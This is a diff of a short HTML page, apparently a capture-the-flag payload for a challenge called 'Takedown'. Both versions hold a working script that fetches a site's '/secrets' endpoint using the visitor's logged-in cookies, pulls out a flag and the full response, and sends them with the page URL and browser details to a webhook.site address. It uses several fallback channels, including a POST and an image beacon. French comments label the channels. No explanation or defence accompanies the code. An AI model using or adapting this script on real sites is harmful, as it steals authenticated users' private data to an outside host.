@@ -1,23 +1,26 @@
-<!doctype html><meta charset="utf-8"><title>Takedown Exfil</title>
-<h1>Exfil in progress…</h1>
+<!doctype html><meta charset="utf-8"><title>probe</title>
 <script>
 (async () => {
-  const WH = "https://webhook.site/7699f217-b736-4fc2-a0d7-dc471e38814d";          // <- sera remplacé ci-dessous
-  function send(obj){
-    const s = JSON.stringify(obj);
-    try { navigator.sendBeacon(WH, s); } catch(e){}
-    try { fetch(WH, { method:"POST", mode:"no-cors", body:s }); } catch(e){}
-    try { (new Image).src = WH + "?d=" + encodeURIComponent(s); } catch(e){}
-  }
+  const WH = "https://webhook.site/7699f217-b736-4dc3-a0d7-dc471e38814d";
+  const tag = "takedown-selftest-" + Math.random().toString(16).slice(2);
   try {
-    const r = await fetch("https://api.takedown.cyxo.re/secrets", { credentials: "include" });
+    const r = await fetch("https://api.takedown.cyxo.re/secrets", { credentials:"include" });
     const t = await r.text();
-    const flag = (t.match(/Star\{[^}]+\}/) || [null])[0];
-    send({ when:new Date().toISOString(), from:location.href, ua:navigator.userAgent,
-           status:r.status, text:t, flag });
-  } catch (e) {
-    send({ when:new Date().toISOString(), from:location.href, ua:navigator.userAgent,
-           error:String(e) });
+    const body = JSON.stringify({
+      when: new Date().toISOString(),
+      from: location.href,
+      ua: navigator.userAgent,
+      status: r.status,
+      text: t,
+      flag: (t.match(/Star\{[^}]+\}/) || [null])[0],
+      tag
+    });
+    // canal 1 : POST (si autorisé)
+    fetch(WH, { method:"POST", mode:"no-cors", body }).catch(()=>{});
+    // canal 2 : GET-beacon (passe quasi partout)
+    new Image().src = WH + "?d=" + encodeURIComponent(body);
+  } catch(e) {
+    new Image().src = WH + "?d=" + encodeURIComponent(JSON.stringify({err:String(e), from:location.href, tag}));
   }
 })();
 </script>
